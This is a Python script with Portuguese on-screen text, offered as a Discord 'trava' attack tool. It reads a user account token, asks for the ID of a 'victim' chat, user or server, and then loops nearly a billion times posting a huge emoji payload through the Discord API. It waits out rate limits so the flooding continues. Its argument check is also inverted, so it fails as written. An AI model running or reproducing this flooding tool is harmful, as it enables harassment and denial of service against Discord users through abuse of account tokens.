#!/usr/bin/python3
# -*- coding: utf-8 -*-

from time import sleep
import requests
import json
import time
import os
import sys
# CORES AQUI BABY#
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"

print(cyan + """
                  ++++++++++++ 
                ++++++++++++++++++ 
              ++++++++++++++++++++++ 
             ++++++++++++++++++++++++ + ++++ 
            ++++++++++++++++++++++++ +++ ++++++       Siga-nos no servidor do discord! https://discord.gg/v5d3PZ9
            ++++++++++++++++++++++++++++++++++++      Follow us in our discord server! https://discord.gg/v5d3PZ9
             ++++++++++++++++++++++++++++++++++++     
             :::::::::,a@@a,:::::,a@a,++++++++++. 
        .ooOOOOOOOOOOo@@@@@@oOoOo@@@@@,++++++++/:. 
     o OOOOOOOOOOOOo@@@@@@@@@oOOo@@@@@@,++++++/::: 
  o oOOOOOOOOOOOOOo@@@@@@@@@@@oOo@@@@@@a  '::::::: 
 oOoOOOOOOOOOOOOOOo@@@@@@@@@@@oOo@@@@@@@   ::::::: 
oOOOOOOOOOOOOOOOOo@@@@@@@@@@@@oOo@@@@@@@   ::: ::' 
oOOOOOOOOOOOOOOOOo`  '@@@@@@@@oOo` '@@@@  ,:'  ' 
oOOOOOOO%%%%%OOOOo    @@@@@@@@oOo   @@@a 
 oOOOO;%%%.%%%OOOo.  ,@@@@@@@oOOo. ,@@@' 
  oOOO%%%.%%%%%OOOoa@@@@@@@@oOOOo@@@@@' 
   OOO%%%.%%%%%%OOo@@@@@@@@oOOOOOo@@@'        .,;%%%%%;. 
    OOO%%.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%//%%%%%%%%% 
      OO%%.%%%%%%%%%%%%%%%%;%%%%%%%%%%%%%%//%%%%%%%%%%%; 
        O%%.....';%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%;' 
          %%.............%%%%%%%%%%%%%%%%%%%%%%%;' 
           %%............`%%,   """"""""""""" 
            %%............%%; 
             %%...........%%; 
              %%%%%%%%%%%%%; 
               `%%%%%%%%%;       
               """)
sleep(5)
os.system(['clear', 'cls'][os.name == 'nt'])
print(white + """
 <=======]}======
    --.   /|
   _\"/_.'/
 .'._._,.'
 :/ \{}/
(L  /--',----._
    |          \\
   : /-\ .'-'\ / |
    \\, ||    \|
     \/ ||    ||                     
        """)
if len(sys.argv) == 1:
	itoken = sys.argv[1]
else: 
	print(yellow + "usage: python3 FVCKDISCORD.py <your itoken>")
os.system(['clear', 'cls'][os.name == 'nt'])
token = itoken # <-- coloque seu token (inspeciona elemento e dá f5 na página, o token é o "authorization")
payload = {'content':'**🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐵🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒🍌🐵🍌🐒**'}
headers = {'Authorization':token,'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.12 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'}


print(white + """
 /$$      /$$                                         /$$
| $$$    /$$$                                        | $$
| $$$$  /$$$$  /$$$$$$  /$$$$$$$  /$$   /$$  /$$$$$$ | $$
| $$ $$/$$ $$ |____  $$| $$__  $$| $$  | $$ |____  $$| $$
| $$  $$$| $$  /$$$$$$$| $$  \ $$| $$  | $$  /$$$$$$$| $$
| $$\  $ | $$ /$$__  $$| $$  | $$| $$  | $$ /$$__  $$| $$
| $$ \/  | $$|  $$$$$$$| $$  | $$|  $$$$$$/|  $$$$$$$| $$
|__/     |__/ \_______/|__/  |__/ \______/  \_______/|__/                                                                                                                                                                         
""")
sleep(2)
print(" ")
print(cyan + "Primeiramente, ative o modo desenvolvedor nas configurações do seu Discord.")
sleep(2)
print(" ")
print( green + "Logo em seguida, vá para o chat de quem você deseja atacar (user/server/grupo).")
sleep(2)
print(" ")
print(magenta + "Na URL de seu navegador, aparecerá o ID da mesma. Copie e cole abaixo.")
sleep(2)
print(" ")
print(yellow + "O script não funciona em quem está offline.")
sleep(2)
print(" ")
print(white + "Redirecionando você ...")
sleep(4)
os.system(['clear', 'cls'][os.name == 'nt'])
print(red + """
              ...                            
             ;::::;        Script produzido por: march0s1as the god.                
           ;::::; :;          Por favor, não faça o mal uso do mesmo.              
         ;:::::'   :;                     
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#              
""")
print(" ")
print(" ")
print(white + "Transcreva abaixo o ID da(s) vítima(s):")
channelId = input()
for _ in range(999999999):
    r = requests.post(f'https://discord.com/api/v8/channels/{channelId}/messages', headers=headers, json=payload)
    if r.status_code == 200:
        print('Trava sendo enviada para a vítima. Apenas relaxe e goze! :)')
    elif r.status_code == 429:
        data = json.loads(r.text)
        print(f'O payload será enviado novamente em {data["retry_after"]} segundos')
        time.sleep(data['retry_after'])
    else:
        print(f'Que porra é essa? Por favor, verifique o ID ou o seu próprio token. Obrigado !')
